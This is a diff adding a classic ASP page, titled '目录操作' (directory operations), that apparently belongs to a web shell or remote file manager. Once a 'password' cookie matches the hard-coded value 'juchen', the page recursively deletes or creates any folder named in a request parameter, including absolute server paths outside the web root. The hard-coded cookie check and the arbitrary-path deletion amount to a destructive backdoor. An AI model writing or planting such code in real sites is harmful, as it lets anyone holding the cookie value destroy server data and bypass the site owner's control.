@@ -1,0 +1,52 @@
+<html>
+
+<head>
+<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
+<title>目录操作</title>
+<style>
+<!--
+table{ font-family: 宋体; font-size: 12pt }
+a{ font-family: 宋体; font-size: 12pt; color: rgb(0,32,64); text-decoration: none }
+a:hover{ font-family: 宋体; color: rgb(255,0,0); text-decoration: underline }
+a:visited{ color: rgb(128,0,0) }
+-->
+</style>
+</head>
+
+<body>
+<% '读文件
+if Request.Cookies("password")="juchen" then 
+
+if request("op")="del"  then
+
+if Request("attrib")="true" then
+whichdir=Request("path")
+else
+whichdir=server.mappath(Request("path"))
+end if 
+Set fs = CreateObject("Scripting.FileSystemObject")
+fs.DeleteFolder whichdir,True
+Response.write "<b>删除的目录为:</b>"&whichdir
+Response.write "<br><b>删除成功</b>！要刷新才能看到效果，你可以<a href='javascript:window.close();'>关闭本窗口</a>了"
+
+else
+
+if request("op")="creat"  then
+if Request("attrib")="true" then
+whichdir=Request("path")
+else
+whichdir=server.mappath(Request("path"))
+end if 
+Set fs = CreateObject("Scripting.FileSystemObject")
+fs.CreateFolder whichdir
+Response.write "<b>建立的目录为:</b>"&whichdir
+Response.write "<br><b>建立成功</b>！要刷新才能看到效果，你可以<a href='javascript:window.close();'>关闭本窗口</a>了"
+end if
+end if
+else
+response.write "对不起!你的密码已经失效或者你输错了密码，请返回重输"
+response.write "<a href='index.asp'>【返 回】</a>"
+end if
+%>
+</body>
+</html>
